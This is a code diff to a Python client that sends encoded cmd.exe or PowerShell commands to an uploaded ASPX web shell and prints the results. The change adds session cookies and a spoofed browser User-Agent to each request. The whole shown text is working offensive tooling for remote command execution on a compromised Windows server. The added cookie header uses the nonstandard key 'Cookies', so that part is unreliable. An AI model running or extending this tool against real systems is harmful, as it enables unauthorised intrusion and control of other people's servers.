@@ -8,6 +8,7 @@ import re
 
 parser = argparse.ArgumentParser(description='Description of your program')
 parser.add_argument('-u','--url', help='URL to Uploaded ASPX WebShell', required=True)
+parser.add_argument('-c','--cookies', help='Cookies for authenticated session', type=str, default='', required=False)
 args = parser.parse_args()
 
 letters = string.ascii_letters + string.digits + string.punctuation
@@ -26,6 +27,13 @@ program = { 'CMD':'C:\\Windows\\System32\\cmd.exe','PWSH':'C:\\Windows\\System32
 
 exe = 'CMD'
 
+headerdict = {}
+
+if len(args.cookies) > 1:
+        headerdict = {'Cookies': args.cookies , 'User-Agent': 'Mozilla/5.0 (x86_64; rv:145.0) Gecko/20100101 Firefox/145.0'}
+else:
+        headerdict = {'User-Agent': 'Mozilla/5.0 (x86_64; rv:145.0) Gecko/20100101 Firefox/145.0'}
+        
 while True:
         binary = exe
         command = input(f"{binary}> ")
@@ -55,6 +63,6 @@ while True:
         payload = base64.b64encode(payload).decode('UTF-8')
         key = base64.b64encode(key).decode('UTF-8')
         #print(payload,':',key)
-        req = requests.post(args.url, data={"instance":payload,"programme":key})
+        req = requests.post(args.url, data={"instance":payload,"programme":key}, headers=headerdict)
         match = pattern.search(req.text)
         print('\n' + match[0][5:][:-14] + '\n')
